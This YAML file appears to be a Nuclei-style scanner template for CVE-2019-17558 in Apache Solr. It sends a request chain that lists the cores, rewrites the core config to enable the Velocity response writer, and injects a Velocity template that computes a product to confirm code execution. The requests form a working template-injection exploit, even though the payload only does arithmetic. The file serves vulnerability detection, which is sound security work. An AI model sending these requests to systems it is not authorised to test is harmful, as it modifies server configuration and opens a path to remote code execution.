id: yaml-poc-apache-solr-other-CVE-2019-17558
info:
  name: Yaml Poc Apache Solr Other Cve 2019 17558
  author: converted
  severity: high
  description: 'Converted from xpoc: yaml-poc-apache-solr-other-CVE-2019-17558'
  tags: apache,cve
  classification:
    cve-id: CVE-2019-17558
  reference:
  - http://packetstormsecurity.com/files/157078/Apache-Solr-8.3.0-Velocity-Template-Remote-Code-Execution.html
  - https://cxsecurity.com/issue/WLB-2020040094
  - https://issues.apache.org/jira/browse/SOLR-13971
  - https://lists.apache.org/thread.html/r0b7b9d4113e6ec1ae1d3d0898c645f758511107ea44f0f3a1210c5d5%40%3Cissues.lucene.apache.org%3E
  - https://lists.apache.org/thread.html/r0b7b9d4113e6ec1ae1d3d0898c645f758511107ea44f0f3a1210c5d5@%3Cissues.lucene.apache.org%3E
http:
- method: GET
  path:
  - /solr/admin/cores?wt=json
  redirects: false
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - responseHeader
- method: POST
  path:
  - /solr/{{core}}/config
  body: "{\n  \"update-queryresponsewriter\": {\n    \"startup\": \"test\",\n    \"\
    name\": \"velocity\",\n    \"class\": \"solr.VelocityResponseWriter\",\n    \"\
    template.base.dir\": \"\",\n    \"solr.resource.loader.enabled\": \"true\",\n\
    \    \"params.resource.loader.enabled\": \"true\"\n  }\n}"
  headers:
    Content-Type: application/json
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
- method: GET
  path:
  - /solr/{{core}}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24c%3D{{r1}}%20*%20{{r2}})%24c
  redirects: false
